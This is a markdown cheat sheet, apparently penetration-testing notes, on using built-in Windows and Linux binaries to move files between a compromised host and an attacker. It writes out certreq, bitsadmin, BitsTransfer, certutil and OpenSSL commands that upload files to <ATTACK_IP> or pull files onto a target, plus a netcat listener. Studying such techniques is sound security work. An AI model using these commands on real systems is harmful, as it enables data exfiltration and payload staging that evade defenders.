# Living off The Land (LOL) Operations

**Living off the Land** refers to using built-in binaries (**LOLBins**) to perform actions beyond their original purpose, such as file transfers. Attackers utilize these to bypass restrictions and avoid bringing external tools onto a target.

### Core Resources

- **LOLBAS**: Repository for Windows binaries.
- **GTFOBins**: Repository for Linux binaries.

---

## Windows File Transfer Techniques

### 1. CertReq.exe (Upload)

**Scenario:** Use to **upload** files from a compromised Windows host to an attack machine by sending a POST request.

**Operational Workflow:**

1. **Listen** on the attack host for incoming traffic.
2. **Execute** the upload from the target machine.

|Parameter|Description|
|:--|:--|
|`-Post`|Specifies the use of an HTTP POST request.|
|`-config`|The URL of the listener.|

**Command Reference:**

- **Attack Host (Listener):**
    
    ```
    sudo nc -lvnp <PORT>
    ```
    
    _(Note: Content received in the session can be copy-pasted into a file)._
    
- **Target Host (Upload):**
    
    ```
    certreq.exe -Post -config http://<ATTACK_IP>:<PORT>/ <FILE_PATH>
    ```
    

**Failure Conditions:**

- **Version Mismatch:** Some versions of `certreq.exe` do not support the `-Post` parameter.
- **Network Errors:** May result in a `WinHttp: 12002 ERROR_WINHTTP_TIMEOUT` if the connection fails.

### 2. Bitsadmin (Download)

**Scenario:** Use for **downloads** from HTTP or SMB. It is designed to be **"intelligent"** by accounting for network and host utilization to minimize impact on the user's foreground work.

**Command Reference:**

```
bitsadmin /transfer <JOB_NAME> /priority foreground http://<ATTACK_IP>:<PORT>/<FILENAME> <DESTINATION_PATH>
```

### 3. PowerShell BitsTransfer (Download/Upload)

**Scenario:** Use when **credentials** or specific **proxy servers** are required for the transfer.

**Command Reference:**

```
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ATTACK_IP>:<PORT>/<FILENAME>" -Destination "<DESTINATION_PATH>"
```

### 4. Certutil (Download)

**Scenario:** A highly common method available on all Windows versions, acting as a functional **wget** equivalent.

**Command Reference:**

```
certutil.exe -verifyctl -split -f http://<ATTACK_IP>:<PORT>/<FILENAME>
```

**Attack Implications:**

- **Detection:** The **Antimalware Scan Interface (AMSI)** currently detects `certutil` usage for file downloads as malicious.

---

## Linux File Transfer Techniques

### 1. OpenSSL (Encrypted Transfer)

**Scenario:** Use to transfer files "Netcat style". This is effective because **OpenSSL** is frequently pre-installed for generating security certificates.

**Operational Workflow:**

1. **Create** a certificate on the attack host to facilitate the encrypted connection.
2. **Start** the OpenSSL server on the attack host, redirecting the file to be sent into the command.
3. **Connect** from the target machine to download the file.

**Command Reference:**

- **Step 1: Create Certificate (Attack Host):**
    
    ```
    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
    ```
    
- **Step 2: Start Server (Attack Host):**
    
    ```
    openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE_TO_SEND>
    ```
    
- **Step 3: Download (Target Host):**
    
    ```
    openssl s_client -connect <ATTACK_IP>:<PORT> -quiet > <FILENAME>
    ```